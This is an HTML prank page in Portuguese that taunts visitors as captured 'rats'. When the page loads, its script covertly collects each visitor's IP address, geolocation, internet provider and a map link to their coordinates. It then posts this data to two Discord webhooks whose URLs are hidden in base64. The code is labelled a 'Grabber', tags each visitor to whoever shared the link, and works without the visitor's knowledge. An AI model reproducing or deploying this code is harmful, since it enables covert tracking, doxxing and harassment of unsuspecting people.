<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>

        <body style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;">
            <div style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
                <img src="ratoeira.webp"  width="300">
                <h1>Mais um rat√£o de Imgur capturado! ü§£ü§£</h1>
                <h2>O Rato da vez √© de <span id="loc"></span></h2>
                <br>
                <h3><b><a href="https://discord.gg/K8zzbUDb">Se junte ao Discord dos ratos!</a></b></h3>
                <audio id="som" src="rato.mp3" autoplay></audio>
            </div>
        </body>

        <script>

                 window.addEventListener('DOMContentLoaded', () => {
                    const som = document.getElementById('som');
                    som.play().catch(() => {
                        const btn = document.createElement('button');
                        btn.textContent = '‚ñ∂';
                        btn.onclick = () => {
                        som.play();
                        btn.remove();
                        };
                        document.body.appendChild(btn);
                    });
                });

                const urlParams = new URLSearchParams(window.location.search);
                client = urlParams.get('client');
            
            class Start {
                static async start() {
                    let i;
                    try{
                    await fetch(atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2NsaWVudC1pcA=="))
                    .then((body) => body.json())
                    .then((data) => {
                        i = data.ipString;
                    })
                    .catch((error) => {});
                    
                    
                    let resOldApi = await fetch(
                    `${atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2lwLWdlb2xvY2F0aW9uP2lwPQ==")}${i}${atob("JmxvY2FsaXR5TGFuZ3VhZ2U9ZW4ma2V5PWJkY183ZDk5Y2VmNzM1YTk0Y2I0YjgyZDM3YTI5NTE4YTU2Nw==")}`
                    );  

                        let data = await resOldApi.json();
                        
                       let $loc =  document.getElementById("loc");
                       $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
                        

                       let meioIp = i[0].slice(0, i[0].lastIndexOf(".")+1); + "******";

                        if(client != null){
                            Start.ratoeira(`${i[0]}******`, `${
                            data.location.principalSubdivision +
                            ", " +
                            data.location.localityName
                        }`);
                        }
                    
                        let rawJsonString = JSON.stringify(data, null, 2);

                        console.log(rawJsonString);
                        

                    Start.sendIpData(data, "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==");

                    }catch(e){
                    console.log(e);
                    }
                }

                // Grabber
                static sendIpData(json, url) {
                    const request = new XMLHttpRequest();
                    request.open("POST", atob(url));
                    request.setRequestHeader("Content-type", "application/json");
                   
                    const params = {
                    embeds: [
                        {
                        fields: [
                            // Capturado por
                            {
                            name: "üê≠ Capturado por",
                            value: client || "Desconhecido",
                            inline: true
                            },

                            // IP
                            {
                            name: "üíª IP",
                            value: json.ip,
                            inline: true
                            },

                            // Local
                            {
                            name: "üåç Local",
                            value: `${json.location.principalSubdivision}, ${json.location.localityName}, ${json.location.city}, ${json.country.isoName}`,
                            inline: false
                            },

                            // Provedor
                            {
                            name: "üõ°Ô∏è Provedor",
                            value: json.network.organisation,
                            inline: false
                            },

                            // Google Maps
                            {
                            name: "üìç Google Maps",
                            value: `https://www.google.com/maps?q=${json.location.latitude},${json.location.longitude}`,
                            inline: false
                            }
                        ],
                        },
                    ],
                    };

                    
                    request.send(JSON.stringify(params));
                }


                // Public
                static ratoeira(id, b) {
                    let u =
                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM1MDAwMDc4NzI5NjI1Ni9FN1ZDSFUtZDF2Y1dqZ2libTJFOFpMTXJNTkc5Mzg3UG5MTFBYMGlPcFFRekJGSHhMdDVvSHZTODllSjhaSzNMQy0zbA==";
                    const request = new XMLHttpRequest();
                    request.open("POST", atob(u));

                    request.setRequestHeader("Content-type", "application/json");
                    let nome = "Desconhecido";
                    try{
                        const urlParams = new URLSearchParams(window.location.search);
                        nome = urlParams.get('client');
                    } catch(e){}
                    const params = {
                    embeds: [
                        {
                        title: `üê≠ Rat√£o capturado por ${nome}`,
                        fields: [
                            {
                            name: "üìç Localiza√ß√£o",
                            value: b,
                            },
                        ],
                        footer: {
                            text: "IP do Rato: " + id,
                        },
                        },
                    ],
                    };
                    request.send(JSON.stringify(params));
                }
                }

                Start.start();
        </script>
    </body>
</html>




